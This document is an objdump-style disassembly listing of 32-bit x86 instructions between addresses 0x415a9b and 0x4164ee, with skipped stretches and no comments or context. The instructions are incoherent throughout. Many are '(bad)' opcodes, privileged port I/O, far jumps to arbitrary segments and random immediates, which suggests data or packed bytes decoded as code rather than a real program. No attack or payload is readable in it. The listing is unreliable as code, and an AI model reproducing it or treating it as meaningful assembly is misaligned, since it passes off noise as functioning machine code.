  415a9b:	inc    edi
  415a9c:	sti    
  415a9d:	xchg   ecx,eax
  415a9e:	ror    DWORD PTR [edi+0x7c5bf1b6],cl
  415aa4:	or     edx,edx
  415aa6:	jl     0x415ae5
  415aa8:	lahf   
  415aa9:	shl    DWORD PTR [edi+0xd],cl
  415aac:	pop    edi
  415aad:	jmp    0x415b15
  415aaf:	adc    eax,0x4fcd720a
  415ab4:	and    ecx,DWORD PTR [edx-0x7]
  415ab7:	test   BYTE PTR [edi],ah
  415ab9:	retf   0xb735
  415abc:	fnsave [esi]
  415abe:	mov    esi,0x3dc12628
  415ac3:	mov    dl,0x9c
  415ac5:	or     al,0x8c
  415ac7:	pop    edx
  415ac8:	cdq    
  415ac9:	and    eax,0x39392b43
  415ace:	push   ebx
  415acf:	inc    ebx
  415ad0:	iret   
  415ad1:	push   esp
  415ad2:	dec    ebp
  415ad3:	push   edx
  415ad4:	test   eax,0xd9600007
  415ad9:	lods   eax,DWORD PTR ds:[esi]
  415ada:	push   es
  415adb:	jo     0x415aad
  415add:	or     al,BYTE PTR [edx+0x38]
  415ae0:	dec    ebx
  415ae1:	mov    cl,0xf8
  415ae3:	arpl   cx,si
  415ae5:	loopne 0x415b54
  415ae7:	push   edx
  415ae8:	jbe    0x415ae0
  415aea:	and    edx,DWORD PTR es:[edx]
  415aed:	mov    ds:0x87d362dd,eax
  415af2:	push   esi
  415af3:	outs   dx,BYTE PTR ds:[esi]
  415af4:	enter  0x31b1,0x67
  415af8:	ja     0x415aa5
  415afa:	sbb    BYTE PTR [ecx],ch
  415afc:	nop
  415afd:	pop    ebx
  415afe:	xor    DWORD PTR [esp+edx*4],edx
  415b01:	clc    
  415b02:	test   eax,0xe0278fda
  415b07:	jno    0x415b85
  415b09:	lock sbb BYTE PTR [esi],dh
  415b0c:	jmp    FWORD PTR ds:0x3fc7b7
	...
  415b72:	add    BYTE PTR [eax],al
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcomp  QWORD PTR [edi+0x3b3bb4e6]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0x4c000001,al
  415b8d:	sub    dh,BYTE PTR [ecx]
  415b8f:	sar    DWORD PTR [edi+eiz*4+0x41],0xe4
  415b94:	int    0x0
  415b96:	arpl   cx,cx
  415b98:	jae    0x415b73
  415b9a:	aam    0x6d
  415b9c:	jle    0x415c0b
  415b9e:	mov    esi,0x8ad1ab0c
  415ba3:	out    0x47,al
  415ba5:	sub    DWORD PTR ds:0x28e517b4,edx
  415bab:	sub    BYTE PTR [ebx+0x75],dh
  415bae:	add    DWORD PTR [esi+0x3848c51f],ebx
  415bb4:	xchg   ecx,eax
  415bb5:	and    BYTE PTR [esi-0x59],ah
  415bb8:	or     eax,0x8e5dfe6a
  415bbd:	dec    ebp
  415bbe:	js     0x415bb9
  415bc0:	fiadd  WORD PTR [edx]
  415bc2:	push   ecx
  415bc3:	mov    eax,0xd09e8667
  415bc8:	jecxz  0x415c20
  415bca:	push   eax
  415bcb:	dec    edi
  415bcc:	scas   al,BYTE PTR es:[edi]
  415bcd:	in     eax,0x2c
  415bcf:	adc    al,BYTE PTR [ebp-0x5a3c975a]
  415bd5:	pop    ds
  415bd6:	mov    ebp,0xd8bdef1a
  415bdb:	call   0xc4bbb79a
  415be0:	jbe    0x415bb1
  415be2:	in     al,dx
  415be3:	mov    bh,0x6c
  415be5:	rcl    BYTE PTR [ecx-0x145fe664],cl
  415beb:	fsub   DWORD PTR ds:0x370c016e
  415bf1:	inc    ebx
  415bf2:	sub    dh,BYTE PTR [esi]
  415bf4:	cdq    
  415bf5:	or     ebp,DWORD PTR [esi-0x5]
  415bf8:	bound  esp,QWORD PTR [eax+ebp*8+0x6a82ed9d]
  415bff:	stc    
  415c00:	dec    edx
  415c01:	mov    ah,0xfe
  415c03:	sar    BYTE PTR ds:0x1bfc6ce4,cl
  415c09:	or     ch,0x28
  415c0c:	imul   eax,ebp,0xffffffc0
  415c0f:	(bad)  
  415c10:	xlat   BYTE PTR ds:[ebx]
  415c11:	(bad)  
  415c12:	jno    0x415c8b
  415c14:	iret   
  415c15:	lods   al,BYTE PTR ds:[esi]
  415c16:	outs   dx,BYTE PTR ds:[esi]
  415c17:	call   FWORD PTR [edx]
  415c19:	mov    es,WORD PTR [edx-0x3]
  415c1c:	sub    ebp,esi
  415c1e:	lds    edi,FWORD PTR [ebx]
  415c20:	adc    eax,DWORD PTR ds:0xa8e19d
  415c26:	jmp    0x7c2451db
  415c2b:	pop    esp
  415c2c:	jecxz  0x415c80
  415c2e:	imul   edx,DWORD PTR [eax+0x1d2acba4],0xc0f8a185
  415c38:	pop    ecx
  415c39:	scas   eax,DWORD PTR es:[edi]
  415c3a:	adc    eax,0x94be196c
  415c3f:	xchg   esp,eax
  415c40:	lahf   
  415c41:	mov    ds:0x8152d6f4,eax
  415c46:	jmp    DWORD PTR [ebx+0x20f6c00f]
  415c4c:	push   esp
  415c4d:	out    dx,al
  415c4e:	repnz mov dh,0xa6
  415c51:	ror    DWORD PTR [esi-0x10149c11],1
  415c57:	inc    esi
  415c58:	into   
  415c59:	jg     0x415cc6
  415c5b:	ret    
  415c5c:	or     al,0xc6
  415c5e:	xchg   edi,eax
  415c5f:	xchg   ebp,eax
  415c60:	int3   
  415c61:	mov    ebx,0xaa4f1656
  415c66:	add    edi,DWORD PTR [ebp+0x50]
  415c69:	(bad)  
  415c6a:	adc    DWORD PTR [eax+ebx*1],edi
  415c6d:	lds    esi,FWORD PTR [ecx]
  415c6f:	mov    WORD PTR [ebp-0x67bbbcfa],gs
  415c75:	imul   ebp,ebp,0x9
  415c78:	popa   
  415c79:	sbb    DWORD PTR [edx+0x15],0x14ab9ce5
  415c80:	pop    es
  415c81:	mov    ah,ch
  415c83:	inc    edx
  415c84:	jmp    0x24a7:0x6967b2e9
  415c8b:	dec    edi
  415c8c:	retf   0xb02b
  415c8f:	jae    0x415c5d
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xfe3d91f
  415d03:	add    eax,0xe640
  415d08:	add    eax,0xcc000001
  415d0d:	add    ebx,DWORD PTR [edx+0x5f873709]
  415d13:	ficomp WORD PTR [edi+0x4d36eedd]
  415d19:	xor    BYTE PTR [esp+eiz*4],0xa
  415d1d:	psubusb mm1,mm7
  415d20:	add    al,0x20
  415d22:	sub    BYTE PTR [edx-0x2be73615],al
  415d28:	(bad)  
  415d29:	retf   
  415d2a:	jmp    0x41ac:0xd72709cc
  415d31:	mov    cl,0x67
  415d33:	sar    esp,cl
  415d35:	cmp    al,0x3a
  415d37:	fdiv   DWORD PTR [ebp-0x49ce1614]
  415d3d:	ds pop ebx
  415d3f:	xlat   BYTE PTR ds:[ebx]
  415d40:	mov    al,ds:0x7856302c
  415d45:	cmp    al,0xa7
  415d47:	fucom  st(5)
  415d49:	scas   eax,DWORD PTR es:[edi]
  415d4a:	jo     0x415ce3
  415d4c:	push   ds
  415d4d:	pop    edx
  415d4e:	add    DWORD PTR [esp+ebp*8-0x1b],ebx
  415d52:	ror    DWORD PTR [esi-0x666925c9],1
  415d58:	and    DWORD PTR [ecx],eax
  415d5a:	and    BYTE PTR ds:0x36e2985f,bh
  415d60:	lock arpl WORD PTR [ecx-0x314a835e],sp
  415d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d68:	retf   0xe3fb
  415d6b:	push   ebx
  415d6c:	fist   DWORD PTR [ebx-0x137f8e0c]
  415d72:	mov    ebx,0x81b309fc
  415d77:	fcomp  DWORD PTR [esi]
  415d79:	add    esi,ebx
  415d7b:	out    0x4d,eax
  415d7d:	in     al,dx
  415d7e:	nop
  415d7f:	shl    BYTE PTR [edx],0x91
  415d82:	mov    ebx,0xc78a9459
  415d87:	das    
  415d88:	pop    edi
  415d89:	dec    edi
  415d8a:	xor    eax,0x7d26c828
  415d8f:	sbb    dl,bl
  415d91:	pop    ebp
  415d92:	adc    BYTE PTR [edx-0x13],ch
  415d95:	in     eax,0x96
  415d97:	mov    bh,0xd8
  415d99:	call   0xb1c7ce2f
  415d9e:	ins    DWORD PTR es:[edi],dx
  415d9f:	mov    ?,ebx
  415da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da2:	cmp    ah,BYTE PTR [esi+0x77]
  415da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415da6:	(bad)  
  415da7:	std    
  415da8:	sub    bl,BYTE PTR [eax]
  415daa:	xor    ebp,ebx
  415dac:	jnp    0x415dfa
  415dae:	push   eax
  415daf:	push   edx
  415db0:	lea    eax,[ecx]
  415db2:	add    eax,0xce364f43
  415db7:	xchg   BYTE PTR [esi+esi*4-0x28],ch
  415dbb:	mov    es,WORD PTR [ecx]
  415dbd:	scas   eax,DWORD PTR es:[edi]
  415dbe:	outs   dx,BYTE PTR ds:[esi]
  415dbf:	jl     0x415e00
  415dc1:	pop    ss
  415dc2:	mov    ds:0x3fc580cc,eax
  415dc7:	mov    eax,0xdb2e564f
  415dcc:	push   ds
  415dcd:	pop    esp
  415dce:	scas   al,BYTE PTR es:[edi]
  415dcf:	pop    ss
  415dd0:	and    edx,DWORD PTR [ebp-0x3]
  415dd3:	rol    DWORD PTR [esi-0x453de169],1
  415dd9:	into   
  415dda:	mov    edi,0xf7fe2b5f
  415ddf:	xor    DWORD PTR [ebx-0x30],edx
  415de2:	popa   
  415de3:	jo     0x415dd8
  415de5:	call   0x59d:0x209fd197
  415dec:	mov    edi,0xe4e9018
  415df1:	xor    eax,0x23a95f58
  415df6:	mov    ?,ebp
  415df8:	stc    
  415df9:	sub    edx,DWORD PTR [edx-0x7c3e2e8e]
  415dff:	xchg   edi,eax
  415e00:	cdq    
  415e01:	push   es
  415e02:	and    edx,esp
  415e04:	mov    cl,0x4b
  415e06:	test   eax,0xf2c3adbd
  415e0b:	out    dx,eax
  415e0c:	aas    
  415e0d:	mov    ecx,DWORD PTR [edi+0x6ef2]
	...
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x7b]
  415e81:	dec    eax
  415e82:	aas    
  415e83:	add    DWORD PTR [ebp-0x19],0x1050000
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	stos   BYTE PTR es:[edi],al
  415e8d:	sbb    ch,BYTE PTR [esp+esi*1-0x64]
  415e91:	sbb    BYTE PTR [ecx+0x15dd50db],bl
  415e97:	sti    
  415e98:	pop    ds
  415e99:	mov    ebx,0x34514e08
  415e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e9f:	ds sbb eax,0x592db88e
  415ea5:	add    esp,0xc53f2b2c
  415eab:	jge    0x415f08
  415ead:	xchg   DWORD PTR [ecx+eax*1],ecx
  415eb0:	repz cmc 
  415eb2:	pop    edx
  415eb3:	out    0x96,al
  415eb5:	xor    bl,bl
  415eb7:	inc    ebx
  415eb8:	(bad)  
  415eb9:	cmp    DWORD PTR [ebp-0x6974e0f3],edi
  415ebf:	and    eax,0x1292c647
  415ec4:	pushf  
  415ec5:	mov    dh,0x3d
  415ec7:	gs pop ecx
  415ec9:	jne    0x415e8f
  415ecb:	icebp  
  415ecc:	popf   
  415ecd:	test   BYTE PTR [ecx],al
  415ecf:	neg    DWORD PTR [esi]
  415ed1:	loope  0x415f4f
  415ed3:	inc    esp
  415ed4:	addr16 out 0x52,eax
  415ed7:	pop    edi
  415ed8:	pushf  
  415ed9:	aas    
  415eda:	test   eax,0x467eb99f
  415edf:	std    
  415ee0:	std    
  415ee1:	pmullw mm1,QWORD PTR [ebp+0x6a]
  415ee5:	ins    BYTE PTR es:[edi],dx
  415ee6:	push   eax
  415ee7:	shl    edx,cl
  415ee9:	ja     0x415f1d
  415eeb:	clc    
  415eec:	mov    ecx,0x11ea0b0b
  415ef1:	ins    DWORD PTR es:[edi],dx
  415ef2:	jo     0x415e9e
  415ef4:	pop    edx
  415ef5:	rcr    DWORD PTR [edi-0x48],1
  415ef8:	pop    esp
  415ef9:	cdq    
  415efa:	aas    
  415efb:	in     eax,dx
  415efc:	aaa    
  415efd:	pop    ebx
  415efe:	cli    
  415eff:	inc    ebx
  415f00:	add    DWORD PTR [ebx+0x2441c87c],eax
  415f06:	mov    esi,0x2543db6d
  415f0b:	lds    ecx,FWORD PTR [esp+ebp*1]
  415f0e:	sbb    ebx,DWORD PTR [ecx-0x33638f76]
  415f14:	pop    ds
  415f15:	mov    dh,0xd9
  415f17:	jmp    0x415f3f
  415f19:	mov    ebp,0xcd48bcea
  415f1e:	pushf  
  415f1f:	or     al,0x6d
  415f21:	jno    0x415ed7
  415f23:	cmp    al,0xe3
  415f25:	je     0x415f21
  415f27:	lahf   
  415f28:	xor    DWORD PTR ds:0x895ebf70,ebp
  415f2e:	inc    esp
  415f2f:	loopne 0x415ed9
  415f31:	mov    edi,edi
  415f33:	mov    ecx,0xfadd1840
  415f38:	xor    ch,BYTE PTR [eax+ebp*1-0x349f2ca2]
  415f3f:	in     al,0xf6
  415f41:	in     eax,0xf2
  415f43:	mov    WORD PTR [ebx+0x33c1adfc],ds
  415f49:	push   esi
  415f4a:	leave  
  415f4b:	push   edx
  415f4c:	or     dh,BYTE PTR [edx+0x64]
  415f4f:	retf   0xbba8
  415f52:	scas   al,BYTE PTR es:[edi]
  415f53:	pop    esi
  415f54:	mov    al,ds:0xa009e47b
  415f59:	out    dx,al
  415f5a:	push   ss
  415f5b:	aad    0x59
  415f5d:	pop    esi
  415f5e:	ror    DWORD PTR [esi+eiz*1],1
  415f61:	lahf   
  415f62:	daa    
  415f63:	out    0x39,eax
  415f65:	mov    al,ds:0xc68605ec
  415f6a:	add    bl,BYTE PTR [esi+ecx*2]
  415f6d:	and    al,0xfe
  415f6f:	jo     0x415fdf
  415f71:	mov    bl,0xe7
  415f73:	push   0xffffffd1
  415f75:	cwde   
  415f76:	add    eax,0x9d8846f6
  415f7b:	push   edi
  415f7c:	fdiv   QWORD PTR [esi-0x14250c39]
  415f82:	fstp   QWORD PTR [edi]
  415f84:	cld    
  415f85:	xor    esp,DWORD PTR [ecx-0x73]
  415f88:	adc    BYTE PTR [edi-0x1439eb15],al
  415f8e:	out    0x6e,eax
  415f90:	inc    edi
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	adc    esi,DWORD PTR [eax]
  416002:	mov    ecx,0xe84a5f
  416007:	add    BYTE PTR ds:0xeb000001,al
  41600d:	int    0x96
  41600f:	add    ah,BYTE PTR [ecx-0x52]
  416012:	mov    dl,0x7c
  416014:	pop    edx
  416015:	lods   eax,DWORD PTR ds:[esi]
  416016:	xchg   ecx,eax
  416017:	not    BYTE PTR [edx-0x6]
  41601a:	pop    esp
  41601b:	sbb    BYTE PTR [ecx],dl
  41601d:	(bad)  
  41601e:	xor    edi,DWORD PTR [ebx-0x3a516854]
  416024:	cmp    DWORD PTR [ebx+0x1d],0xffffffe8
  416028:	add    dh,BYTE PTR [edx-0x495343a3]
  41602e:	pop    ss
  41602f:	mov    ah,bl
  416031:	call   0x78f8:0x5200e9b9
  416038:	int3   
  416039:	addr16 jne 0x416085
  41603c:	or     BYTE PTR [edx+0x2b],ah
  41603f:	(bad)  
  416041:	mov    esi,cs
  416043:	imul   eax,DWORD PTR [eax+0x38],0x29
  416047:	xchg   ebx,eax
  416048:	(bad)  
  416049:	shl    BYTE PTR [edi+0x76],1
  41604c:	cmc    
  41604d:	cli    
  41604e:	xchg   DWORD PTR [edi-0x30],ebx
  416051:	dec    ebx
  416052:	imul   edi,DWORD PTR [ecx],0xe6b8eb65
  416058:	in     eax,dx
  416059:	arpl   WORD PTR [ecx+0x15],si
  41605c:	fnstcw WORD PTR [eax]
  41605e:	test   DWORD PTR [esi],ebp
  416060:	(bad)
  416063:	dec    eax
  416064:	addr16 adc al,0x0
  416067:	loopne 0x415fff
  416069:	push   edi
  41606a:	or     bl,ch
  41606c:	inc    ebx
  41606d:	xchg   ebx,eax
  41606e:	push   0x43
  416070:	dec    esp
  416071:	sub    edx,edi
  416073:	xchg   edx,eax
  416074:	xlat   BYTE PTR ds:[ebx]
  416075:	sbb    al,0x1b
  416077:	cmp    DWORD PTR [ecx+0x73a0830a],ebp
  41607d:	xlat   BYTE PTR ds:[ebx]
  41607e:	(bad)  
  41607f:	mov    esp,0xb20a3e08
  416084:	inc    esi
  416085:	pushf  
  416086:	dec    eax
  416087:	xchg   ebp,eax
  416088:	popf   
  416089:	pop    ss
  41608a:	mov    al,es:0x1746e90a
  416090:	mov    ah,0xbf
  416092:	mov    ch,BYTE PTR [edx]
  416094:	loope  0x41605a
  416096:	inc    ebx
  416097:	xlat   BYTE PTR ds:[ebx]
  416098:	pop    ebp
  416099:	scas   eax,DWORD PTR es:[edi]
  41609a:	std    
  41609b:	add    al,0x7
  41609d:	xor    al,ah
  41609f:	or     DWORD PTR [ecx+0x59928a6d],eax
  4160a5:	add    BYTE PTR [esi+ebx*8-0x29d98afd],al
  4160ac:	je     0x416054
  4160ae:	pop    edi
  4160af:	sub    bh,dh
  4160b1:	xchg   esp,eax
  4160b2:	adc    eax,0x74acfd9e
  4160b7:	stos   DWORD PTR es:[edi],eax
  4160b8:	pusha  
  4160b9:	xchg   esi,esp
  4160bb:	sbb    BYTE PTR [esi],0xba
  4160be:	ins    DWORD PTR es:[edi],dx
  4160bf:	dec    edx
  4160c0:	mov    esi,0x1ce59965
  4160c5:	sbb    ebp,DWORD PTR [edx+0x18]
  4160c8:	jno    0x4160e6
  4160ca:	es mov ch,0x1c
  4160cd:	jae    0x4160c1
  4160cf:	jb     0x416125
  4160d1:	sbb    eax,0x605f32d9
  4160d6:	xor    eax,0x484199d4
  4160db:	dec    edx
  4160dc:	repz sbb ebp,DWORD PTR [ebp-0x22]
  4160e0:	adc    eax,DWORD PTR [eax+0x59]
  4160e3:	sahf   
  4160e4:	sbb    BYTE PTR [esi+0x4e1c01d7],bl
  4160ea:	fs mov dl,ch
  4160ed:	push   ss
  4160ee:	xchg   ebp,eax
  4160ef:	iret   
  4160f0:	loop   0x416165
  4160f2:	jmp    0xda280abd
  4160f7:	xlat   BYTE PTR ds:[ebx]
  4160f8:	dec    ecx
  4160f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160fa:	push   ss
  4160fb:	mov    edx,0xaa39f290
  416100:	sub    BYTE PTR [ecx+ecx*2-0x20],dl
  416104:	and    eax,0x88ddab73
  416109:	out    dx,eax
  41610a:	or     al,0xe2
  41610c:	mov    ss,WORD PTR [edi+eax*4]
  41610f:	cmp    ebx,eax
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0xb6b7aaf3
  416183:	mov    al,0x4f
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	cld    
  41618d:	fnstsw WORD PTR [ecx-0x31]
  416190:	mov    ds:0x718f38c6,al
  416195:	push   ebp
  416196:	push   0xffffff95
  416198:	mov    cl,0xb2
  41619a:	jge    0x4161ff
  41619c:	lods   al,BYTE PTR ds:[esi]
  41619d:	push   ds
  41619e:	and    bh,BYTE PTR [esi-0x1debd9bb]
  4161a4:	ins    DWORD PTR es:[edi],dx
  4161a5:	stos   DWORD PTR es:[edi],eax
  4161a6:	xchg   edi,eax
  4161a7:	neg    DWORD PTR [ebx+0x62]
  4161aa:	mul    BYTE PTR [ebp+0x4]
  4161ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161ae:	fdivr  st,st(7)
  4161b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b2:	push   edi
  4161b3:	enter  0xd6a0,0xe0
  4161b7:	call   DWORD PTR [edi+edx*8-0x49]
  4161bb:	pusha  
  4161bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161bd:	xor    al,0x0
  4161bf:	dec    esi
  4161c0:	xor    bl,dl
  4161c2:	cdq    
  4161c3:	ds popf 
  4161c5:	and    BYTE PTR [ecx+0x6319f542],dh
  4161cb:	sbb    esi,DWORD PTR [edi-0x32583a19]
  4161d1:	stc    
  4161d2:	xor    al,0x7b
  4161d4:	out    0x44,eax
  4161d6:	sub    ebp,DWORD PTR [edi-0x414acb30]
  4161dc:	nop
  4161dd:	sbb    eax,0x5e060530
  4161e2:	and    DWORD PTR [edx-0x18],0x899a8d13
  4161e9:	lahf   
  4161ea:	push   esp
  4161eb:	push   cs
  4161ec:	push   cs
  4161ed:	adc    esp,DWORD PTR [edi+ebp*1+0x716db309]
  4161f4:	xlat   BYTE PTR ds:[ebx]
  4161f5:	scas   al,BYTE PTR es:[edi]
  4161f6:	pop    es
  4161f7:	inc    ebp
  4161f8:	and    BYTE PTR [esi+0x4e848c19],ah
  4161fe:	cmp    al,0xc7
  416200:	int3   
  416201:	cli    
  416202:	cmp    al,0x30
  416204:	popf   
  416205:	idiv   esi
  416207:	stos   DWORD PTR es:[edi],eax
  416208:	jge    0x41618a
  41620a:	lds    ecx,FWORD PTR [edx+0x1c]
  41620d:	retf   0xbc18
  416210:	sti    
  416211:	dec    eax
  416212:	add    al,ch
  416214:	test   DWORD PTR ds:0x50e97194,esp
  41621a:	mov    eax,0xcc36737
  41621f:	mov    DWORD PTR [esp],edx
  416222:	mov    al,ds:0xbd3b8a92
  416227:	std    
  416228:	jmp    0x4161c8
  41622a:	js     0x41624a
  41622c:	or     ecx,DWORD PTR [esi+ecx*8+0x61edcc87]
  416233:	xchg   esi,eax
  416234:	or     al,0xc
  416236:	jle    0x4161fe
  416238:	xor    BYTE PTR [esi],0x31
  41623b:	es mov eax,0x66a58e27
  416241:	fdivr  DWORD PTR [ebp+edi*2-0x1c14745a]
  416248:	call   0xe28b648a
  41624d:	stos   BYTE PTR es:[edi],al
  41624e:	cdq    
  41624f:	xchg   edx,eax
  416250:	(bad)  
  416251:	out    0x1,eax
  416253:	or     al,0x32
  416255:	adc    al,0xc7
  416257:	sahf   
  416258:	nop
  416259:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41625b:	shl    BYTE PTR [esi+ebp*4+0x5762073f],0x7
  416263:	xor    BYTE PTR [ebx+0x2c4a134f],dh
  416269:	int3   
  41626a:	mov    ecx,0x8cafa3ec
  41626f:	adc    dh,bl
  416271:	sub    al,0xf7
  416273:	xor    dl,BYTE PTR [ebx+ecx*4-0x10d9544c]
  41627a:	push   ebx
  41627b:	cmp    esp,edi
  41627d:	rcl    DWORD PTR [edi+edx*8+0x11],1
  416281:	pop    edx
  416282:	adc    ebx,DWORD PTR [edi]
  416284:	adc    DWORD PTR [eax],ebp
  416286:	fst    DWORD PTR [edx+0xe]
  416289:	or     ebx,DWORD PTR es:[edi]
  41628c:	pop    ebx
  41628d:	out    0x48,eax
  41628f:	retf   
  416290:	pop    esp
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5479:0xd74358ee
  416305:	jmp    0x0:0x1050000
  41630c:	bswap  ebx
  41630e:	dec    esi
  41630f:	outs   dx,DWORD PTR ds:[esi]
  416310:	loopne 0x4162ef
  416312:	std    
  416313:	iret   
  416314:	sub    eax,0x3098f433
  416319:	scas   al,BYTE PTR es:[edi]
  41631a:	xchg   BYTE PTR [ecx+0x77a48592],al
  416320:	jnp    0x4162c6
  416322:	and    al,0xb4
  416324:	push   es
  416325:	stos   BYTE PTR es:[edi],al
  416326:	jle    0x41636c
  416328:	jecxz  0x41631d
  41632a:	mov    ah,0x8f
  41632c:	pop    ebp
  41632d:	dec    DWORD PTR [esi+0x5a]
  416330:	aad    0x9b
  416332:	cmp    al,0x58
  416334:	call   0x750ddf93
  416339:	lahf   
  41633a:	add    al,0x2f
  41633c:	repz pop edi
  41633e:	test   esp,0x7ef86122
  416344:	inc    ebx
  416345:	or     eax,0xf3d27bbe
  41634a:	enter  0x6b4f,0x54
  41634e:	shl    DWORD PTR [edx-0x4bafcf4d],1
  416354:	pop    esp
  416355:	ror    BYTE PTR [ebx-0x7f],1
  416358:	iret   
  416359:	inc    ebx
  41635a:	scas   eax,DWORD PTR es:[edi]
  41635b:	mov    ah,0x2a
  41635d:	or     eax,0xdc4b113
  416362:	stc    
  416363:	cmp    al,0xb7
  416365:	les    esi,FWORD PTR [ebx]
  416367:	test   DWORD PTR [edx+0x5b],eax
  41636a:	(bad)  
  41636b:	rcl    cl,1
  41636d:	aaa    
  41636e:	scas   eax,DWORD PTR es:[edi]
  41636f:	sbb    al,0x87
  416371:	dec    ebx
  416372:	lods   eax,DWORD PTR ds:[esi]
  416373:	jno    0x416307
  416375:	das    
  416376:	fs push cs
  416378:	pop    eax
  416379:	test   al,0x69
  41637b:	xchg   bh,al
  41637d:	(bad)  
  41637e:	dec    edi
  41637f:	cld    
  416380:	or     BYTE PTR [eax+0x20],0x60
  416384:	dec    eax
  416385:	xchg   DWORD PTR [eax+0x7e8f39da],ebx
  41638b:	mov    ds:0xdda117d8,al
  416390:	fdiv   QWORD PTR [eax+0x216c7eed]
  416396:	mov    ds:0x40d56ff0,al
  41639b:	ficomp DWORD PTR [ebp+0x1567eb73]
  4163a1:	sub    al,0x2d
  4163a3:	jl     0x416384
  4163a5:	mov    WORD PTR [ecx+0x7f],?
  4163a8:	shr    BYTE PTR [ecx],1
  4163aa:	sub    ebx,DWORD PTR [eax+0x2]
  4163ad:	inc    ebx
  4163ae:	add    ebx,ebp
  4163b0:	sub    al,0x47
  4163b2:	nop
  4163b3:	(bad)  
  4163b4:	ins    DWORD PTR es:[edi],dx
  4163b5:	in     al,dx
  4163b6:	les    esi,FWORD PTR [edx+0x8a9a62f]
  4163bc:	push   0x53
  4163be:	pop    ebx
  4163bf:	sub    eax,0xa37b770a
  4163c4:	repnz sub DWORD PTR [edx+0x12585ddf],ecx
  4163cb:	cwde   
  4163cc:	div    DWORD PTR [ebx]
  4163ce:	test   eax,0x5a83f687
  4163d3:	or     al,0x26
  4163d5:	mov    esp,0xc4d45920
  4163da:	cwde   
  4163db:	into   
  4163dc:	hlt    
  4163dd:	add    eax,0xc36d14f6
  4163e2:	outs   dx,BYTE PTR ds:[esi]
  4163e3:	mov    ah,0x68
  4163e5:	jno    0x4163c5
  4163e7:	pmuludq mm6,QWORD PTR [ecx+0x36be2f65]
  4163ee:	and    al,0xc9
  4163f0:	jae    0x416467
  4163f2:	pushf  
  4163f3:	dec    edx
  4163f4:	pop    eax
  4163f5:	mul    eax
  4163f7:	mov    esi,0x611db9bb
  4163fc:	mov    dl,0x4a
  4163fe:	cmp    al,cl
  416400:	dec    eax
  416401:	popf   
  416402:	push   ebp
  416403:	ds popa 
  416405:	fadd   st(3),st
  416407:	mov    al,0x67
  416409:	cmc    
  41640a:	nop
  41640b:	scas   al,BYTE PTR es:[edi]
  41640c:	add    al,0x64
  41640e:	xchg   DWORD PTR [edi+0x5f],ebp
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	jge    0x41649e
  416482:	ins    DWORD PTR es:[edi],dx
  416483:	ret    0xeb59
  416486:	add    BYTE PTR [eax],al
  416488:	add    eax,0xd000001
  41648d:	inc    eax
  41648e:	push   ebp
  41648f:	lds    eax,FWORD PTR [esp+edi*4]
  416492:	sbb    ecx,DWORD PTR [ecx+0x2786b432]
  416498:	add    eax,0xe813d308
  41649d:	shl    BYTE PTR [ebx-0x20],cl
  4164a0:	aaa    
  4164a1:	mov    ebx,0xde9460bd
  4164a6:	dec    ebx
  4164a7:	pop    ds
  4164a8:	fcom   QWORD PTR [esi+0x6]
  4164ab:	lock push ss
  4164ad:	repnz int3 
  4164af:	xchg   ebx,eax
  4164b0:	sahf   
  4164b1:	xlat   BYTE PTR ds:[ebx]
  4164b2:	das    
  4164b3:	js     0x4164fb
  4164b5:	xchg   esp,eax
  4164b6:	rol    bh,0x33
  4164b9:	xchg   esp,eax
  4164ba:	ja     0x4164ea
  4164bc:	push   ss
  4164bd:	hlt    
  4164be:	scas   eax,DWORD PTR es:[edi]
  4164bf:	js     0x41645b
  4164c1:	and    eax,0xaf28c66d
  4164c6:	repnz cs inc ebp
  4164c9:	ds push ecx
  4164cb:	sub    BYTE PTR [ebp+0x3fb8acec],bl
  4164d1:	pusha  
  4164d2:	sti    
  4164d3:	scas   eax,DWORD PTR es:[edi]
  4164d4:	jmp    0x21cd:0x7db23d83
  4164db:	sub    cl,bh
  4164dd:	ror    DWORD PTR [ecx-0x4b76240a],cl
  4164e3:	mov    eax,ds:0x25a86288
  4164e8:	and    DWORD PTR [ebp-0x1e7e3c74],edx
  4164ee:	ficom  WORD PTR [edx-0x66626c89]
